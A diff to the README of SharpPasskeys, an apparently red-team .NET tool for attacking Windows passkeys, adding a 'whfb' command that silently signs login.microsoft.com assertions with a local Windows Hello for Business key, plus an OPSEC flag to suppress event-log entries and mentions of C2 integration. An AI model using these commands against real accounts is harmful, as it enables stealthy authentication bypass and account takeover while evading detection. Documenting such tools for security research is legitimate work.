@@ -5,6 +5,7 @@
 .NET CLI tool that wraps the Windows WebAuthn API (`webauthn.dll`) and the WebAuthn hook DLL for offensive operations against passkeys:
 
 - `prompt` — Trigger a passkey assertion (Windows Hello, security key, or hybrid device) via [WebAuthNAuthenticatorGetAssertion](https://learn.microsoft.com/en-us/windows/win32/api/webauthn/nf-webauthn-webauthnauthenticatorgetassertion)
+- `whfb` — Sign a `login.microsoft.com` assertion directly with a local Windows Hello for Business (NGC) key, without opening a WebAuthn prompt
 - `wait` — Block until the Windows WebAuthn event log records an assertion request (event ID 1103) and optionally kill `CredentialUIBroker.exe`
 - `list` — Enumerate platform authenticators, third-party authenticator plugins, Windows Hello credentials, recent WebAuthn event-log activity, and process window handles
 - `hook` — Load or unload the [WebAuthn hook DLL](WebAuthnHook.md) into running browser processes and listen on the hook control pipe (`\\.\pipe\WebAuthnHook`)
@@ -75,6 +76,42 @@ SharpPasskeys.exe prompt -r contoso.com -c dGVzdA --flood --authenticator Hybrid
 SharpPasskeys.exe prompt -r github.com -c HvxwEkeqxPh-fB_c-wqXvfXiFXiamcEGluyRXSo2XxY --hwnd 2432736
 ```
 
+## whfb command
+
+Signs a WebAuthn assertion for `login.microsoft.com` with a locally available Windows Hello for Business key via `WindowsHelloForBusinessSigner`. Unlike `prompt`, this does not call `WebAuthNAuthenticatorGetAssertion` and does not display an authenticator selection or consent dialog. The local Windows Hello for Business key is expected to already be unlocked.
+
+The Passkey Injector C2 command dialog adds `whfb` variants to the standalone, Mythic Apollo, and BOF lists
+only when the intercepted assertion uses the `login.microsoft.com` relying party.
+
+### Options
+
+| Option | Description |
+|---|---|
+| `--challenge`, `-c <b64url>` | **Required.** Challenge bytes encoded as base64url. |
+| `--signature-counter`, `--counter`, `-s <n>` | Signature counter value to embed in authenticator data. Default `0`. |
+| `--private`, `-p` | Browser is in private mode while the command enumerates registered platform credentials. Skip event log entries. (OPSEC) |
+
+### Example
+
+```powershell
+SharpPasskeys.exe whfb --challenge dGVzdC1jaGFsbGVuZ2U
+```
+
+### Output
+
+```text
+12:34:56 info: Passkeys[0] Signing challenge for relying party 'login.microsoft.com' with local Windows Hello for Business keys...
+{"id":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM","rawId":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM","type":"public-key","response":{"authenticatorData":"...","clientDataJSON":"...","signature":"...","userHandle":"..."},"clientExtensionResults":{}}
+12:34:56 info: Passkeys[0] Generated 1 Windows Hello for Business assertion(s).
+```
+
+### More examples
+
+```powershell
+# Suppress the platform credential enumeration event log entry
+SharpPasskeys.exe whfb -c dGVzdA --private
+```
+
 ## wait command
 
 Subscribes to the `Microsoft-Windows-WebAuthN/Operational` event log via [EventLogWatcher](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.eventing.reader.eventlogwatcher) and blocks until event ID 1103 (`WebAuthNAuthenticatorGetAssertion` request) is recorded. When the event arrives, the timestamp, Windows user, and relying party ID are printed and — optionally — `CredentialUIBroker.exe` is terminated to interrupt the in-flight prompt.
@@ -135,11 +172,11 @@ SharpPasskeys.exe list authenticators
 #### Output
 
 ```text
-+--------------+---------------+--------+
-| ID           | Name          | Locked |
-+--------------+---------------+--------+
-| V2luLWhlbGxv | Windows Hello | No     |
-+--------------+---------------+--------+
++--------------------------------------+---------------+--------+
+| AAGUID                               | Name          | Locked |
++--------------------------------------+---------------+--------+
+| 08987058-cadc-4b81-b6e1-30de50dcbe96 | Windows Hello | No     |
++--------------------------------------+---------------+--------+
 ```
 
 ### list plugins
@@ -382,4 +419,4 @@ SharpPasskeys.exe apiversion
 
 ## Notes
 
-The CLI uses [System.CommandLine](https://learn.microsoft.com/en-us/dotnet/standard/commandline/) and the [DSInternals.Win32.WebAuthn](https://www.nuget.org/packages/DSInternals.Win32.WebAuthn) wrapper around `webauthn.dll`. Release builds are merged into a single assembly with [dnMerge](https://github.com/CCob/dnMerge).
+The CLI uses [System.CommandLine](https://learn.microsoft.com/en-us/dotnet/standard/commandline/) and [DSInternals.Win32.WebAuthn](https://www.nuget.org/packages/DSInternals.Win32.WebAuthn) 3.3.0, including its `WindowsHelloForBusinessSigner` helper. Release builds are merged into a single assembly with [dnMerge](https://github.com/CCob/dnMerge).
